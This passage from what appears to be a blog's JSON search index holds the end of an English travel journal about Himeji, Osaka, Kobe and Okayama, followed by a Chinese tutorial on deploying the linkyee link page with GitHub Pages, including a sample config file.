today, so my phone was almost out of battery. Given the long queue, I decided not to continue climbing and turned back at the second floor.After exiting the castle, I walked back to San-no-Maru Plaza and then headed outside.Kushiyaki Kobe beefI found a shop selling Kobe beef in the shopping street outside Himeji Castle and took away a Kobe beef rice bowl and skewers to the hotel to rest and recharge.13:20 Back to the hotel to restThe weather was not great, plus I had hiked in the morning and my phone was dead, so I decided to rest at the hotel.The portion was a bit small, but the Kobe beef here tasted pretty good.15:30 Shopping near Himeji StationAfter resting until about 15:30, I headed out again.I was surprised to find that there wasn’t much to shop for near Himeji Station. There was only the Piole shopping center and the SANYO department store, along with a small shopping street. There was no Don Quijote, McDonald’s, and only one Lawson and one Matsumoto Kiyoshi drugstore.On the third floor of Piole, Kiddy Land had some cute merchandise. There weren’t many people, so I bought three little toys to take home, but I couldn’t find the sleepwear version of Usagi, unfortunately.I wandered around the shopping street looking for capsule toy shops.Although I just said there wasn’t much to shop for, at least there were capsule toy shops and an Animate store.As evening approached, it started to rain heavily. Fortunately, I didn’t have any special plans for the day.~=18:00 Dinnerおだしとワインとお料理と。mottoI randomly chose a restaurant in the shopping street that served Kobe beef for dinner.This place had a unique appetizer, a lucky cat dessert that wasn’t too sweet and quite nice.I ordered a Kobe beef steak, tea rice, and a draft beer. I found the Kobe beef steak to be just average; it was tough and didn’t have much of the Kobe flavor. However, the tea rice was quite delicious.After eating, I wandered around a bit in Himeji after the rain.~=20:00 Back to the hotel to rest &amp; watch the Japan vs. Taiwan baseball gameFrom a Japanese perspective, I couldn’t understand the broadcast content at all, but the information provided was very comprehensive. On the left, there were baseball trivia, and on the right, there was a complete analysis of the pitches.In the end, Japan won the game. Good night, Himeji.Day 6 (Sunday, 11/17) Osaka, KobeI initially wanted to rush to see the Naruto whirlpools and the Akashi Kaikyō Bridge, but the weather was still poor, so I decided to go shopping in Osaka and Kobe instead.~=08:45 Take the Shinkansen to Shin-OsakaI took the Shinkansen to Shin-Osaka (25 minutes) and then transferred to the Midosuji Line to Osaka. The travel time was about the same as taking a regular train directly to Osaka, but the Shinkansen has many departures, so I chose the more comfortable option that also allowed me to charge my devices.9:17 Arrived at Shin-OsakaAfter arriving at Shin-Osaka, I had to walk a bit to get to the Midosuji Line.First, I headed to the Namba Yasaka Shrine, which I missed during my last trip to the Kansai region.I took the train to Namba Station and walked a short distance to find the shrine in a small alley. I just realized that Osaka is also testing facial recognition for entering and exiting the station.~=9:50 Arrived at Namba Yasaka ShrineThe shrine was small and crowded with tourists. I took a few photos and left.After leaving, I continued walking to the next station, “Daikokucho,” and took one stop to “Zoo-mae” to head to Tsutenkaku.Upon exiting the station, I walked through an underground passage and shopping street until I saw the Tsutenkaku Tower. This area felt a bit unsafe; as soon as I exited the station and crossed the underground passage, there were many homeless people, and I even heard some arguing loudly, which was a bit scary.The narrow shopping street had food on both sides, with a few popular restaurants that had long lines.Around 10:30, I arrived at the base of Tsutenkaku, but there was a long line of people waiting to go up, so I decided to give up.I walked back to the subway station to return to Osaka.~=11:00 Back in Osaka UmedaAfter exiting the station, I went to the LINKS department store, where the fifth floor connects directly to the Yodobashi capsule toy area.After exploring LINKS, I crossed through Osaka Station and the Time Space Plaza above, heading straight to the Osaka Daimaru department store.On the 13th floor, there was a Pokémon Center, Osaka Nintendo, CAPCOM, and more.I briefly looked at the Zelda merchandise, but since I had already bought a lot last time, I didn’t buy anything this time and left.I passed by the Hanshin Tigers merchandise store.I was planning to eat at Shake Shack, which I had enjoyed in Bangkok back in July and wanted to relive the experience in Osaka.~=12:00 Shake ShackShake Shack Hanshin Umeda Store is right next to the Hanshin Tigers merchandise store.I ordered an avocado bacon chicken burger and a milkshake using the self-service kiosk. The space was quite large with plenty of seating.Osaka StationAfter eating, I strolled around near Osaka Station, thinking about checking out Kiddy Land for some Chiikawa merchandise.I got lost in the underground shopping area of Osaka and wandered for a long time before finally finding Hankyu Sanbangai. I then walked through the underground passage from the South Building to the North Building, where the food street was located.Kiddy Land had its own separate section on the other side.13:00 Kiddy Land Osaka ChiikawaThere were quite a few people in line, and I estimated I would have to wait at least 40 minutes. Naturally, I didn’t want to spend that much time waiting.On the first floor, there was a Kumamoto Bear event.Perhaps due to it being a holiday, there were more events happening. Outside Kiddy Land, there was also a photo opportunity with Kanaheala. (Another Usagi XD)13:20 Head to KobeAfter getting a bit lost in the underground shopping area, I finally found the Osaka Umeda subway station and took the Hankyu Kobe Line to Sannomiya in Kobe.13:50 Arrived in KobeIt was still early, so I planned to visit the Kobe Animal Kingdom to see the capybaras.Google Maps directed me to take the “New Transportation Port Island Line,” but I wandered around the underground shopping area for ages without finding the right signs. (Lost Day)Once I exited the station, I realized that the line I needed was the one above, entering from the second floor of Sannomiya Station.The station was crowded, and later I found out that today happened to be the Kobe Marathon.Lost Day… I accidentally boarded the wrong train because it arrived just as I was getting on, heading towards Kitano. The tragedy began at that moment. To get to the Kobe Animal Kingdom, you need to take the train to Kobe Airport; the train to Kitano will just take you back to Kobe. ⚠️⚠️⚠️The Kobe Marathon had closed off roads, and this subway line is similar to the early tire-based metro systems like the Taipei Wenhu Line.14:20 Realized I was on the wrong train and got off at NakakubeI sensed something was off and got off at this station. Google Maps suggested I walk back to the Citizen’s Plaza Station to catch the next train.Since this area is a newly developed port zone, it felt quite desolate and the walk seemed long.As I approached the Citizen’s Plaza Station, I was surprised by the lively atmosphere; it turned out to be the finish line event for the Kobe Marathon. Tragedy 2: Because there were too many people, I couldn’t enter this station and had to walk further to Minami Park Station.After reaching Minami Park Station, I was just one stop away, but I was too lazy to take the subway and decided to walk to the Kobe Animal Kingdom instead…As mentioned earlier, the area felt quite desolate, and it was indeed a long walk—about 2 kilometers (approximately 30 minutes) from Nakakube.14:50 Arrived at the Kobe Animal KingdomTicket price: 2,200 yenThe Kobe Animal Kingdom is a mix of indoor and outdoor spaces, and the layout is quite well planned. It features a variety of birds and animals, most of which you can see up close, making it a great place for families to spend half a day. The animals here are in much better condition compared to those at the Himeji City Zoo, and the environment is very clean.CapybarasI achieved my goal of coming here: to pet the capybaras. They are so plump, and their fur feels rough, almost like a broom.Each one looks so lazy; it must be nice not to have to work!Perhaps because they are too fat, they currently do not allow feeding them food from inside the park, nor can you feed them food from outside or place anything on their heads.In another area, there are kangaroos and sheep for close interactions.Remember to wash your hands before and after petting!There was also a seal, but it seemed the space was too small, and it kept swimming in circles. QQPenguin feeding (requires a ticket).The adorable little family of Asian small-clawed otters was constantly chirping.There was also a Malayan tapir in the otter area, but it didn’t seem to pay much attention to it. QQThere were toucans and owls, along with pheasants that would appear at your feet. (Watch your step ⚠️)King Julien with a pelican that eats its colleagues, and there are also owls in the night exhibit.Inside, there’s an interactive area with rabbits, cats, and dogs (requires a ticket), as well as dining and souvenir shops, etc.Overall, it was a great experience!15:50 Left, preparing to return to KobeThe main reason for coming was to pet the capybaras, and since I didn’t have much time, I didn’t stay too long.~= 16:05 Arrived at Sannomiya Station (Kobe)Due to the Kobe Marathon, there were many people exiting the station.With over an hour until dinner, I decided to explore the area around Sannomiya, looking for capsule toys and Kiddy Land.The Kiddy Land in Kobe wasn’t very crowded, but there were very few Gudetama products, and I couldn’t find the pajamas I wanted.The Center Plaza here is a bit dated but has many shops to browse.I went to the second floor to look for capsule toys and check out a second-hand store to see if they had the Gudetama I wanted.There was a bookstore called Nobunaga, where I could buy omamori (amulets) to give to friends. Hehe.~=17:00 Kobe Beef YoshikichiOn B1, there’s a Kobe Beef Yoshikichi, and I arrived for dinner just before 5 PM.It was still early, and there weren’t many people; the owner was very welcoming when he heard I was from Taiwan. This meal was also one of the main reasons for coming to Kobe: to have a good meal—Kobe beef—since I had mostly been eating randomly during my stay.I ordered the “Kobe Beef Sirloin Steak 220g” for 7,700 yen (pre-tax ⚠️, remember to include tax at checkout) along with a set (salad, rice, soup) and a draft beer.The salad was refreshing, and the soup was beef broth, which was delicious.The meat was tender, juicy, and flavorful. Compared to the Kobe beef I had yesterday, this was the real taste of Kobe beef. However, I must say I still prefer teppanyaki; it surpasses Western-style cooking.The final bill: $2,158 TWD.17:40 Finished eating and left, heading to Kobe TowerAfter dinner, I walked to the Old Foreign Settlement along the coastline and then took a train one stop before walking to Kobe Tower.Kobe felt very lively (compared to Himeji), with many department stores to explore.I took the train towards Shin-Nagata and got off at the next stop, Kouencho.18:05 Arrived near Kobe TowerLast year when I came, it was under maintenance, but it is now fully open.Kobe Port has a charming harbor town feel, and if I have the chance, I would consider staying here for a night.This time, I just did a quick tour before leaving.18:30 Back to Kobe ChinatownOn my way back to Kobe Station, I stopped by Chinatown to buy Kobe Frantz chocolates as souvenirs.Back at JR Motomachi StationPlease note that this is JR Motomachi Station, so don’t accidentally go to Hanshin Electric Railway Motomachi Station.18:53 Took the Rapid train towards Himeji, heading to Kobe (Hyogo)18:57 Transferred to the new rapid train on the opposite platform, heading to Kosei Line via Naka The transfer took about 20 minutes, and luckily I made it just in time before the duty-free hours ended at the only Matsumoto Kiyoshi in Himeji.This train model requires you to press the button next to the door to open it, and the compartments are separated from each other.19:34 Arrived in Himeji19:45 Arrived at Himeji Piole Matsumoto Kiyoshi for drugstore shopping Please note that although their operating hours are until 21:00, the duty-free hours only last until 20:30. ⚠️⚠️⚠️Bought a super mini Cup Noodle.On my last night in Japan, I enjoyed some late-night snacks and beer at the hotel. (These meatballs had a soft texture…) Goodnight, Himeji.Day 7 (11/18 Monday) Okayama, Return Trip08:30 Good Morning, HimejiOne last look at Himeji in the morning.Arrived at the Shinkansen station to catch the 08:52 train to Okayama.Taking the 08:52 Shinkansen unreserved seat to Okayama09:13 Arrived at Okayama StationThe Shinkansen ride takes about 21 minutes to reach Okayama Station. Unfortunately, I didn’t have enough time to visit Hiroshima again this time.Just like last time, I headed straight to the west exit of Okayama Station to catch the airport bus. There are lockers available for luggage storage, and there are also restrooms (the department stores weren’t open yet, so there were few options).09:30 McDonald’s at Okayama Station for the popular “McGriddle” from TaiwanI almost picked the wrong item because I couldn’t read Japanese; I needed to choose the “マックグリドル” for the pancake series. Breakfast at McDonald’s in Japan is served until 10:30.After eating around 10:00, I didn’t have any specific places in mind to visit.I’ve already visited Okayama Castle and Kibitsu Shrine last time, so I decided to stroll around Okayama AEON Mall.Okayama Art FestivalThis year, Okayama is hosting an art festival.Okayama Station is under construction, and Momotaro has been temporarily moved next to the station.Crossed the street from the underground mall to AEON MALL B2, where there’s also a McDonald’s.This place is huge and great for shopping, with almost all brands available.You can find food and souvenirs (B1-B2) here as well.I continued looking for capsule toys but couldn’t find the train button capsule toy I wanted, so I gave up… it seems they haven’t restocked.There are also several stores selling Gachapon.~=11:00 Preparing for lunch Although I wasn’t very hungry, I needed to eat to prepare for the afternoon flight, as Tigerair doesn’t provide meals. ⚠️⚠️⚠️There are many dining options upstairs.Pork Steak Specialty Store B OkayamaI chose a restaurant that specializes in teppanyaki pork steak.I ordered a teppanyaki pork steak set (200g) and a draft beer. The total came to 2,178 yen.I was surprised that the pork steak was not fully cooked when it arrived; it was about 70% cooked. After checking reviews, it seems this is the restaurant’s specialty, but I still cooked the pieces of meat that could be cooked while the grill was hot. It was really delicious, very juicy, with a strong meaty flavor, and it was tender; I personally think it rivals the Kobe beef from yesterday (I might not have a rich person’s palate).My small suitcase (about the size of AirPods Pro) and my bag.Finally, I bought some items at Muji on the first floor and left around 12:15.~=12:30 Back at Okayama StationPreparing to take the 13:00 shuttle to Okayama Airport.Taking one last look at Okayama.~=13:00 Taking the shuttle to Okayama AirportI lined up at platform 21 to wait for the bus. No need to worry about missing it; anyone who arrives before 13:00 will be taken to the airport (they will add more shuttles if it gets full).You can use a transportation card (Suica) to get on and off or buy a ticket at the waiting area.Since it was full, the bus departed early at 12:45.~=13:20 Arrived at Okayama Momotaro AirportIt was still very early; this year I was on a flight departing at 17:30. Last year, I took the 15:25 flight, which was just right. Now, arriving for the 17:30 flight means I have to wait almost 4 hours. However, there’s nothing I can do because the next bus is at 15:55, arriving at 16:25; although the airport is small and there’s only one flight departing at a time, it’s hard to guarantee that I’ll arrive by 16:25 due to potential traffic issues. When I came, I encountered a traffic jam that added almost 30 minutes to my travel time. I’ll have to see if Okayama Airport increases the shuttle frequency or if I can find someone in the Japan Travel Discussion Group to share a taxi. I’ve heard from others that a taxi from Okayama Station to the airport costs around 7,000 yen.Wandering around near the airport, there’s a mini version of Okayama Korakuen and some beautiful maple leaves outside the airport.There’s also a statue of Momotaro outside the station, and the airport kindly reminds you to buy insurance; I almost got hit by a bicycle this time. ⚠️There are quite a few seats in the domestic terminal where you can rest.The first floor only has one souvenir shop and nothing else. Just like last year, I bought an ice peach mochi to eat.The second floor is under renovation, and only a few shops are open. It seems the observation deck that was accessible last year is also closed; at least there’s still one souvenir shop and a few food options.~=15:00 Starting the check-in processMomotaro Airport is quite small, and the check-in and baggage drop process is different from other airports. Here, everyone lines up together; those with checked luggage go through X-ray and get a sticker seal, while those without checked luggage don’t need to (the security check before departure will scan other items). Even those without checked luggage must line up ; when you reach the front, just tell the airport staff you don’t have checked luggage, and you can go through. If you open your suitcase after getting the sticker, you’ll have to rescan and reapply the sticker. ⚠️⚠️⚠️ The airport staff can speak Chinese… very impressive.~=15:15 Check-in and baggage drop completedThis time I didn’t buy much; I didn’t buy any alcohol, and my luggage was already 17 kg… but I hardly had any carry-on luggage, as everything was packed inside.~=16:20 Starting security check and departureThe airport is under renovation… but there are still capsule toys.Even though there’s only one flight, the airport is small, there are few staff, and only one line, so the security check took about 20-30 minutes.The area for filling water and discarding items is just a box. It feels like if you take the 15:55 bus from Okayama, arriving at 16:25, if you arrive on time, the check-in and baggage drop would already be empty, and you could go directly to the security check. You should be able to make it. Since we are the only flight, they will probably wait until everyone who has checked in has completed security before taking off, so arriving early or late for security won’t make a difference.~=16:42 Starting to wait for boardingThe waiting area isn’t large, and there’s only one duty-free shop selling a limited selection of souvenirs, tobacco, and alcohol.I wanted to buy a few cans of peach soda to bring back to Taiwan, but they were all sold out; I ended up getting a can of Red Tea Kaden, which I found to be very tasty and not too sweet. I regretted not buying more.~=18:10 Departure (delayed by 40 minutes) Goodbye Okayama, goodbye Japan.On the plane, I sat next to a nice YouTuber named “Chill with us.” He was very friendly and was visiting Shikoku this time. We exchanged recommendations for attractions, and I hope to visit Shikoku someday.19:45 Arrived in Taiwan (delayed by 10 minutes)Fortunately, the delay was only 10 minutes. I quickly picked up my luggage and rushed to the bus station.20:20 Taking the Da-Yo Bus to TaipeiDepending on the location, you can take different buses home. Previously, I took the Kuo-Kuang bus directly to Taipei, but this time I took the Da-Yo bus from platform 11 back to New Taipei. Coincidentally, my EasyCard balance was insufficient to swipe, so I rushed to the counter to buy a ticket with cash (thankfully I had some TWD on me from the day before), and I managed to catch the bus.Journey concluded.Summary of ThoughtsThe itinerary this time was too packed, and we rushed through many places. The first three days were especially hectic due to long travel distances and short stops, which meant we didn’t get to fully enjoy the beautiful scenery of Izumo and Matsue in Shimane. If I have the chance, I would love to visit again to watch the sunset, see the autumn leaves, and experience the Shinto rituals during the festivals.If you’re interested in learning about the history of Izumo, you can check out Lan Dad’s videos: [How was this land of Japan born? It was actually born from something!! Japanese Mythology The Birth of Japan Creation of Heaven and Earth Kuniumi Kamiumi The Great Eight Islands Izanagi Izanami Lan Dad Tells Stories](https://www.youtube.com/watch?v=cnp9H–KPyY){:target=”_blank”} [The most mischievous god in Japan, who had a child with his own sister, becoming the direct ancestor of the Japanese imperial family! He slayed the Yamata no Orochi and married a beautiful wife, making him a “winner” in the divine realm! The first Waka poem in Japan actually came from him?! Japanese Mythology Susanoo Iwato Yamata no Orochi Inaba no Shirousagi Lan Dad Tells Stories](https://www.youtube.com/watch?v=W8SjLltb3U4){:target=”_blank”} Why did a rabbit provoke a group of sharks? After experiencing death and resurrection twice, he ended up marrying the daughter of his ancestor! The Myth of Okuninushi | Okuninushi | Inaba no Shirousagi | The Land of Roots | Japanese Mythology | Lan Dad Tells StoriesThese videos introduce the stories of Amaterasu, Okuninushi (Izumo Shrine), and Inaba no Shirousagi.Travel Journal of the Sanyo Region: Okayama and Hiroshima [Travel Journal] 2023 Sanyo Region 6-Day Free Trip to Hiroshima and OkayamaYou can also refer to the travel journal of the Sanyo region. If you have time, consider combining Sanyo and San’in for your trip.KKday Promotions 🛒 Japan JR PASS | Tottori &amp; Matsue Area Pass | eMCO Electronic Ticket (Consider this if you’re only visiting Matsue and Tottori) Kansai &amp; San’in Region Rail Pass JRPass (The best choice for entering and exiting Okayama Airport) [**Japan eSIM Card Daily High-Speed, Total Data, Unlimited Data Plans**](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} Japan JR PASS | Sanyo &amp; San’in Region Rail Pass | eMCO Electronic Ticket (Experience all of the Sanyo and San’in regions in one go) [Tottori Sand Dunes Japan’s Only Thrilling Sandboarding Experience](https://www.kkday.com/zh-tw/product/184144?cid=19365){:target=”_blank”} [【Tottori Bus Day Tour】 Tottori Sand Dunes, Uratomi Coast Cruise, Sand Museum, Pear Picking Experience Includes Special Lunch (Departing from Osaka)](https://www.kkday.com/zh-tw/product/11463-osaka-bus-tour-tottori-sand-dunes-uratomi-coast-cruise-sand-museum-japan?cid=19365){:target=”_blank”} 2-Day Bus Tour Visiting Tottori Sand Dunes and Famous Izumo Taisha (Departing from Osaka) New Year Visit! 3-Hour Stop at Izumo Taisha 【Departing from Hiroshima】 If you found this article helpful, feel free to use my promotional link to purchase KKday products and tours. I will earn a small commission, which helps me continue creating more travel content. Thank you!More Travel Journals [Travel Journal] 2023 Kyushu 10-Day Solo Trip [Travel Journal] 2023 Sanyo Region 6-Day Free Trip to Hiroshima and Okayama [Travel Journal] 9/11 Nagoya One-Day Flash Tour [Travel Journal] 2023 Tokyo 5-Day Free Trip [Travel Journal] 2023 Keihanshin 8-Day Free TripIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I’ll receive a small commission to support more travel content. Thank you! Follow Me on Medium 1K+ Followers 297 Total Views Last Statistics Date: 2025-08-15 | 251 Views on Medium." }, { "title": "linkyee — 使用 GitHub Pages 快速免費建立個人類 LinkTree 連結頁面", "url": "/posts/zrealm-robotic-process-automation/linkyee-%E4%BD%BF%E7%94%A8-github-pages-%E5%BF%AB%E9%80%9F%E5%85%8D%E8%B2%BB%E5%BB%BA%E7%AB%8B%E5%80%8B%E4%BA%BA%E9%A1%9E-linktree-%E9%80%A3%E7%B5%90%E9%A0%81%E9%9D%A2-70aeddb1fd9b/", "categories": "ZRealm Robotic Process Automation", "tags": "linktree, github-pages, automation, ruby, jekyll", "date": "2024-10-27 13:36:34 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.linkyee — 使用 GitHub Pages 快速免費建立個人類 LinkTree 連結頁面使用 GitHub Pages 快速建立自己的連結頁面，100% 免費、客製化並支援自訂義網域成果https://link.zh...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.linkyee — 使用 GitHub Pages 快速免費建立個人類 LinkTree 連結頁面使用 GitHub Pages 快速建立自己的連結頁面，100% 免費、客製化並支援自訂義網域成果https://link.zhgchg.li 我以把成果開源並打包成 Template Repo (linkyee)，有需要的朋友可以直接 Fork 快速部署使用。linkyee — Your Own Link Pages優點： 直接部署在 Github Pages 穩定、免費 掌握 HTML 原始檔案，可隨意修改排版、樣式、移除廣告、版權宣告； (預設樣式就是我用 GenAI ChatGPT 建立的) 支援自訂域名 支援動態變數，例如我預設建了 Medium 追蹤者、Github Repo 星星數變數，可自動帶入、更新追蹤者數量在頁面上。 🚀🚀🚀 頁面載入快速 照本文簡單幾步就能完成設定部署Github PagesGithub Pages 是由 Github 提供的免費靜態頁面寄存服務，所有 Github Free 帳號只要是 Public Repo 都能直接使用，如果是 Private Repo 則須先付費升級 Github 帳號。限制 只能寄存靜態檔案資源： HTML, CSS, JavaScript, 字體檔案, 圖片檔案, PDF, 音訊檔案, 文字檔案…等等 網站(Repo)大小不得超過： 1 GB 這猜測也是軟限制，因為我的 Github Pages Jekyll Repo 已經快 5 GB 了。 部署工作時間最長： 10 分鐘 每小時最多部署： 10 次 (軟限制) 每月流量限制 ：100 GB (軟限制) 請求過於頻繁可能會響應 HTTP 429其他 Github Pages 應用文章 我使用 Github Pages 部署的 Jekyll Blog ➡️ ZhgChgLi 無痛轉移 Medium 到 Github Pages Github Pages 自訂網域教學開始使用 — 部署在 GitHub Pages步驟 1. 點擊 linkyee 範本庫右上角的「Use this template」按鈕 -&gt;「Create a new repository」：步驟 2. 勾選「Include all branches」，輸入您想要的 GitHub Pages 倉庫名稱，完成後點擊「Create repository」： GitHub Pages Repo 名稱就會是訪問網址。 如果將 Repo 名稱輸入為 your-username.github.io ，那麼這將成為您的 GitHub Pages 網站的直接訪問網址。 如果您已有 your-username.github.io Repo，那麼 GitHub Pages 網址將會是 your-username.github.io/Repo-Name 。等待 Fork 完成。初次建立時可能會遇到部署錯誤，這是由於 Fork 倉庫的權限問題。接下來我們按照步驟進行調整。步驟 4. 前往 Settings -&gt; Actions -&gt; General，確保選擇以下選項： Actions permissions: Allow all actions and reusable workflows Workflow permissions: Read and write permissions選擇完畢後，點擊 Save 按鈕儲存變更。步驟 5. 前往 Settings -&gt; Pages，確認 GitHub Pages 的分支設定為「gh-pages」： 「Your site is live at: XXXX」訊息即為您的 GitHub Pages 公開訪問網址。步驟 6. 前往 Settings -&gt; Actions，等待第一次部署完成：步驟 7. 訪問 GitHub Pages 網址，確認 Fork 是否成功： 恭喜！部署成功，現在您可以修改設定檔案，將其替換為您的資料。🎉🎉🎉設定設定檔案編輯位於根目錄中的 config.yml 文件。# 網站配置 # 主題名稱，對應至目錄：./theme/xxxx theme: default # HTML 語言設定 lang: \"en\" # 插件（實作於 ./plugins/PLUGIN_NAME） # 在下方設定中使用 {{ vars.PLUGIN_NAME }} # 插件的輸出結果可在下方使用，例如：{{vars.MediumFollowersCountPlugin}} plugins: # 自動獲取 Medium 的追蹤者數量 - MediumFollowersCountPlugin: username: zhgchgli # 自動獲取 GitHub 倉庫的星標數量 - GithubRepoStarsCountPlugin: - ZhgChgLi/ZMarkupParser - ZhgChgLi/ZReviewTender - ZhgChgLi/ZMediumToMarkdown - ZhgChgLi/linkyee # Google Analytics 追蹤 ID google_analytics_id: # HTML 標題 title: \"ZhgChgLi 的連結集\" # 頭像圖片路徑 avatar: \"./images/profile.jpeg\" # 名稱區塊文字 name: \"@zhgchgli\" # 標語區塊文字 tagline: &gt;- 一位來自台灣的 iOS、網頁與自動化開發者，熱愛分享、旅行與寫作。 # 連結列表 # icon：使用 Font Awesome 圖示 (https://fontawesome.com/search?o=r&amp;m=free) # text：顯示在連結上的文字 # title：連結的標題 # url：連結的網址 # alt：替代文字（無障礙使用） # target：`_blank` 在新頁籤打開，`_self` 在同頁面打開 links: - link: icon: \"fa-brands fa-medium\" text: \"技術部落格 &lt;span class='link-button-text'&gt;({{vars.MediumFollowersCountPlugin}} Followers)&lt;/span&gt;\" url: \"https://blog.zhgchg.li\" alt: \"ZhgChgLi 的技術部落格\" title: \"ZhgChgLi 的技術部落格\" target: \"_blank\" - link: icon: \"fa-brands fa-medium\" text: \"旅行日誌 &lt;span class='link-button-text'&gt;({{vars.MediumFollowersCountPlugin}} Followers)&lt;/span&gt;\" url: \"https://medium.com/ztravel\" alt: \"ZhgChgLi 的旅行日誌\" title: \"ZhgChgLi 的旅行日誌\" target: \"_blank\" - link: icon: \"fa-solid fa-rss\" text: \"個人網站\" url: \"https://zhgchg.li/\" alt: \"ZhgChgLi 的網站\" title: \"ZhgChgLi 的網站\" target: \"_blank\" - link: icon: \"fa-brands fa-swift\" text: \"ZMarkupParser &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZMarkupParser']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZMarkupParser\" alt: \"ZMarkupParser 是一個純 Swift 庫，用於將 HTML 字串轉換為具自訂樣式的 NSAttributedString。\" title: \"ZMarkupParser 是一個純 Swift 庫，用於將 HTML 字串轉換為具自訂樣式的 NSAttributedString。\" target: \"_blank\" - link: icon: \"fa-brands fa-app-store-ios\" text: \"ZReviewTender &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZReviewTender']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZReviewTender\" alt: \"ZReviewTender 是一個從 App Store 和 Google Play Console 獲取應用評論並整合至工作流程的工具。\" title: \"ZReviewTender 是一個從 App Store 和 Google Play Console 獲取應用評論並整合至工作流程的工具。\" target: \"_blank\" - link: icon: \"fa-brands fa-markdown\" text: \"ZMediumToMarkdown &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/ZMediumToMarkdown']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/ZMediumToMarkdown\" alt: \"ZMediumToMarkdown 是一個強大的工具，可輕鬆下載並將 Medium 文章轉換為 Markdown 格式。\" title: \"ZMediumToMarkdown 是一個強大的工具，可輕鬆下載並將 Medium 文章轉換為 Markdown 格式。\" target: \"_blank\" - link: icon: \"fa-brands fa-github\" text: \"linkyee &lt;span class='link-button-text'&gt;({{vars.GithubRepoStarsCountPlugin['ZhgChgLi/linkyee']}} Stars)&lt;/span&gt;\" url: \"https://github.com/ZhgChgLi/linkyee\" alt: \"linkyee 是一個完全自訂且開源的 LinkTree 替代方案，可直接部署在 GitHub Pages 上。\" title: \"linkyee 是一個完全自訂且開源的 LinkTree 替代方案，可直接部署在 GitHub Pages 上。\" target: \"_blank\" # 社交媒體連結列表 # icon：使用 Font Awesome 圖示 (https://fontawesome.com/search?o=r&amp;m=free) # title：連結的標題 # url：社交媒體連結的網址 # alt：替代文字（無障礙使用） # target：`_blank` 在新頁籤打開，`_self` 在同頁面打開 socials: - social: icon: \"fa-brands fa-medium\" url: \"https://blog.zhgchg.li\" title: \"ZhgChgLi 的 Medium\" alt: \"ZhgChgLi 的 Medium\" target: \"_blank\" - social: icon: \"fa-brands fa-github\" url: \"https://github.com/ZhgChgLi\" title: \"ZhgChgLi 的 GitHub\" alt: \"ZhgChgLi 的 GitHub\" target: \"_blank\" - social: icon: \"fa-brands fa-twitter\" url: \"https://twitter.com/zhgchgli\" title: \"ZhgChgLi 的 Twitter\" alt: \"ZhgChgLi 的 Twitter\" target: \"_blank\" - social: icon: \"fa-brands fa-linkedin\" url: \"https://www.linkedin.com/in/zhgchgli/\" title: \"ZhgChgLi 的 LinkedIn\" alt: \"ZhgChgLi 的 LinkedIn\" target: \"_blank\" - social: icon: \"fa-brands fa-instagram\" url: \"https://www.instagram.com/zhgchgli/\" title: \"Instagram\" alt: \"ZhgChgLi 的 Instagram\" target: \"_blank\" - social: icon: \"fa-solid fa-envelope\" url: \"zhgchgli@gmail.com\" title: \"Email: zhgchgli@gmail.com\" alt: \"zhgchgli@gmail.com\" target: \"_blank\" # 頁尾文字 footer: &gt; 歡迎來到我的網站！追蹤我在 Medium 或 GitHub 上的最新動態，或在 Instagram 和 LinkedIn 上保持聯繫。 # 頁尾版權聲明 # Linkyee 是一個 100% 免費的開源專案—您可以隨意修改版權聲明。:) copyright: &gt; © 2024 &lt;a href=\"https://zhgchg.li\" target=\"_blank\"&gt;ZhgChgLi&lt;/a&gt;。由 &lt;a href=\"https://github.com/ZhgChgLi/linkyee\" target=\"_blank\"&gt;linkyee&lt;/a&gt; 提供技術支持。 請注意，每次修改文件後，您需要等待 GitHub Actions 完成自動建置和頁面建置與部署任務。 重新整理頁面以使變更生效。🚀成功！！自訂風格樣式、修改預設主題 ./themes/default/index.html ./themes/default/styles.css ./themes/default/scripts.js創建新主題 ./themes/ YOUR_THEME 在 config.yml 文件中更新為 theme:YOUR_THEME沒錯，您可以使用像 ChatGPT 這樣的 GenAI 工具，來幫助您創建自訂的連結頁面！(預設樣式也是我用 ChatGPT 產的)自動重新部署預設情況下，專案每天會自動重新部署一次，以刷新插件的動態變數值。您可以在 Github Action — Automatic build ( .github/workflows/build.yml) 中調整 cron 設定：schedule: - cron: '0 0 * * *' # 每日午夜 00:00 (UTC) 執行如果不需要定時重新部署，可以直接刪除 schedule 區塊。自訂網域 ❤️❤️❤️您可以設置自訂的 GitHub Pages 網域， 例如我的： https://link.zhgchg.li 。可以找我之前的文章「 Github Pages 自訂網域教學 」一步一步從購買到綁定網域，也可以通過 我的 Namecheap 推廣連結購買網域 — 我將獲得部分分潤，這將幫助我繼續貢獻開源專案。Buy me a coffee ❤️❤️❤️https://www.buymeacoffee.com/zhgchgli如果這個專案對您有幫助，請考慮 Star Repo、推薦給朋友 ， 或 贊助我一杯咖啡。感謝您的支持！歡迎提出 Issue，或透過 Pull Request 提交修正或貢獻。:)有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 581 Total Views Last Statistics Date: 2025-08-15 | 493 Views on Medium." }, { "title": "linkyee — Quickly and Free Create Your Personal LinkTree Page Using GitHub Pages", "url": "/posts/zrealm-robotic-process-automation/en/linkyee-quickly-and-free-create-your-personal-linktree-page-using-github-pages-70aeddb1fd9b/", "categories": "ZRealm Robotic Process Automation", "tags": "linktree, github-pages, automation, ruby, jekyll", "date": "2024-10-27 13:36:34 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版linkyee — Quickly and Free Create Your Personal 